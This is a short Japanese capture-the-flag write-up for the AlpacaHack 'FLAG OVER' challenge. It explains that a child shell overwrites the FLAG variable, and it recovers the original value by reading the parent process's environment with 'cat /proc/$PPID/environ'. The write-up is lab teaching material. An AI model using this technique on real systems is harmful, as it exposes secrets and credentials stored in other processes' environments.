# FLAG OVER

## 問題

https://alpacahack.com/daily/challenges/flag-over

## 解法

server.pyについて
```
import os
import subprocess

# 環境変数FLAGの値がAlpaca{で始まってるならasser Trueで続行。Falseなら停止。
assert os.getenv("FLAG").startswith("Alpaca{")

# subprocess.run(コマンド)でコマンド実行
# ["bash", "-i"]のiはinteractive（対話モード）でコマンドを入力できる状態になる
# 環境変数FLAGの値を"🦙"に上書き
subprocess.run(["bash", "-i"], env={"FLAG": "🦙"})
```

server.pyを実行してみるとbashの対話モードに入る
```
nc localhost 1337
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
```

FLAGの環境変数が上書きされている
```
nobody@0816fd723f82:/app$ echo $FLAG
echo $FLAG
🦙
```

子プロセスの環境変数を変更しても、親プロセスの環境変数は変わらないので親プロセスの環境変数を表示する。

$PPIDは親プロセスのID。

/procはプロセス情報。/proc/$PPID/environは親プロセスの環境変数の情報。

tr '\0' '\n'はNULL文字を改行に置き換える。
```
nobody@0816fd723f82:/app$ cat /proc/$PPID/environ | tr '\0' '\n'
cat /proc/$PPID/environ | tr '\0' '\n'
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
FLAG=Alpaca{REDACTED}
```
